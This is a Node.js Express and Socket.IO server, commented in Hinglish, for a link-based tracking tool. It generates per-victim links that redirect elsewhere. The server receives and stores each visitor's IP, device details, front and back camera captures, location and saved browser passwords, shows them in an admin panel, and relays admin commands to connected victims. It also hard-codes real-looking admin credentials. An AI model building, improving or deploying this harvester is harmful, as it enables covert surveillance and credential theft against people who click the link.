// ==========================================
// 1. SAB SE PEHLE: LIBRARIES IMPORT KAREIN
// ==========================================
const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const cors = require('cors');
const path = require('path');
const fs = require('fs');
const bodyParser = require('body-parser');
const session = require('express-session');
const { v4: uuidv4 } = require('uuid');

// ==========================================
// 2. APP DEFINE KAREIN (SAB SE PEHLE)
// ==========================================
const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
    cors: {
        origin: "*",
        methods: ["GET", "POST"]
    }
});

// ==========================================
// 3. MIDDLEWARE SETUP
// ==========================================
app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static('public'));
app.use(session({
    secret: 'your-secret-key',
    resave: false,
    saveUninitialized: true,
    cookie: { secure: false }
}));

// ==========================================
// 4. DATABASE SETUP
// ==========================================
const DB_PATH = path.join(__dirname, 'database');
const USERS_FILE = path.join(DB_PATH, 'users.json');

if (!fs.existsSync(DB_PATH)) {
    fs.mkdirSync(DB_PATH);
}

if (!fs.existsSync(USERS_FILE)) {
    fs.writeFileSync(USERS_FILE, JSON.stringify([]));
}

// ==========================================
// 5. DATABASE FUNCTIONS
// ==========================================
const readUsers = () => {
    try {
        const data = fs.readFileSync(USERS_FILE);
        return JSON.parse(data);
    } catch (error) {
        return [];
    }
};

const writeUsers = (users) => {
    fs.writeFileSync(USERS_FILE, JSON.stringify(users, null, 2));
};

// ==========================================
// 6. ROUTES - ADMIN LOGIN & VISITOR
// ==========================================

// Admin login
app.post('/admin-login', (req, res) => {
    const { email, password } = req.body;
    
    if (email === 'somuandsagar@gmail.com' && password === 'Somesh143x@4565') {
        req.session.admin = true;
        res.json({ success: true, message: 'Login successful' });
    } else {
        res.status(401).json({ success: false, message: 'Invalid credentials' });
    }
});

// Get all visitors
app.get('/api/visitors', (req, res) => {
    if (!req.session.admin) {
        return res.status(401).json({ error: 'Unauthorized' });
    }
    const users = readUsers();
    res.json(users);
});

// Get specific visitor
app.get('/api/visitor/:id', (req, res) => {
    const users = readUsers();
    const visitor = users.find(u => u.id === req.params.id);
    if (visitor) {
        res.json(visitor);
    } else {
        res.status(404).json({ error: 'Visitor not found' });
    }
});

// ==========================================
// 7. NEW ROUTES - CUSTOM LINK & DELETE
// ==========================================

// Generate custom link
app.post('/generate-custom-link', (req, res) => {
    const { redirectUrl } = req.body;
    const visitorId = uuidv4();
    const link = `${req.protocol}://${req.get('host')}/visitor/${visitorId}`;
    
    const visitorInfo = {
        id: visitorId,
        link: link,
        redirectUrl: redirectUrl,
        createdAt: new Date().toISOString(),
        status: 'pending'
    };
    
    const users = readUsers();
    users.push(visitorInfo);
    writeUsers(users);
    
    res.json({ success: true, link: link, visitorId: visitorId, redirectUrl: redirectUrl });
});

// Delete visitor
app.delete('/api/visitor/:id', (req, res) => {
    if (!req.session.admin) {
        return res.status(401).json({ error: 'Unauthorized' });
    }
    
    let users = readUsers();
    users = users.filter(u => u.id !== req.params.id);
    writeUsers(users);
    
    res.json({ success: true });
});

// ==========================================
// 8. FALLBACK ROUTE FOR VISITOR REDIRECT
// ==========================================
app.get('/api/visitor-redirect/:id', (req, res) => {
    const users = readUsers();
    const visitor = users.find(u => u.id === req.params.id);
    if (visitor && visitor.redirectUrl) {
        res.json({ redirectUrl: visitor.redirectUrl });
    } else {
        res.json({ redirectUrl: 'https://www.google.com' });
    }
});

// ==========================================
// 9. FRONTEND ROUTES
// ==========================================

// Serve pages
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.get('/admin', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});

app.get('/visitor/:id', (req, res) => {
    res.sendFile(path.join(__dirname, 'views', 'visitor.html'));
});

// ==========================================
// 10. SOCKET.IO CONNECTION
// ==========================================

// Store connected clients
const connectedClients = new Map();
const visitorData = new Map();

io.on('connection', (socket) => {
    console.log('New client connected:', socket.id);
    
    socket.on('visitor-connect', (data) => {
        const { visitorId, userAgent, platform, screenResolution, battery, simNetwork } = data;
        
        const ip = socket.handshake.address;
        
        const users = readUsers();
        const userIndex = users.findIndex(u => u.id === visitorId);
        
        if (userIndex !== -1) {
            users[userIndex] = {
                ...users[userIndex],
                ip: ip,
                deviceName: platform,
                networkName: userAgent,
                userAgent: userAgent,
                battery: battery || 'N/A',
                simNetwork: simNetwork || 'N/A',
                visitDate: new Date().toISOString(),
                connected: true,
                socketId: socket.id,
                connectedAt: new Date().toISOString()
            };
            writeUsers(users);
            
            connectedClients.set(visitorId, socket.id);
            visitorData.set(visitorId, users[userIndex]);
            
            io.emit('visitor-connected', users[userIndex]);
        }
    });
    
    socket.on('visitor-data', (data) => {
        const { visitorId, type, content } = data;
        
        const users = readUsers();
        const userIndex = users.findIndex(u => u.id === visitorId);
        
        if (userIndex !== -1) {
            if (type === 'frontCamera') {
                users[userIndex].frontCamera = content;
                users[userIndex].lastCameraUpdate = new Date().toISOString();
            } else if (type === 'backCamera') {
                users[userIndex].backCamera = content;
                users[userIndex].lastCameraUpdate = new Date().toISOString();
            } else if (type === 'location') {
                users[userIndex].location = content;
                users[userIndex].lastLocationUpdate = new Date().toISOString();
            } else if (type === 'savedPasswords') {
                users[userIndex].savedPasswords = content;
            } else if (type === 'redirectComplete') {
                users[userIndex].redirectComplete = true;
                users[userIndex].redirectTime = new Date().toISOString();
            }
            
            writeUsers(users);
            
            io.emit(`${type}-data`, { visitorId, content });
        }
    });
    
    socket.on('disconnect', () => {
        console.log('Client disconnected:', socket.id);
        
        for (let [visitorId, socketId] of connectedClients) {
            if (socketId === socket.id) {
                const users = readUsers();
                const userIndex = users.findIndex(u => u.id === visitorId);
                if (userIndex !== -1) {
                    users[userIndex].connected = false;
                    users[userIndex].disconnectedAt = new Date().toISOString();
                    writeUsers(users);
                    
                    io.emit('visitor-disconnected', visitorId);
                }
                connectedClients.delete(visitorId);
                visitorData.delete(visitorId);
                break;
            }
        }
    });
    
    socket.on('admin-command', (data) => {
        const { visitorId, command } = data;
        const socketId = connectedClients.get(visitorId);
        
        if (socketId) {
            io.to(socketId).emit('admin-command', { command });
        }
    });
});

// ==========================================
// 11. SERVER START (SAB SE LAST MEIN)
// ==========================================

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`Server running on http://localhost:${PORT}`);
    console.log(`Admin panel: http://localhost:${PORT}/admin`);
});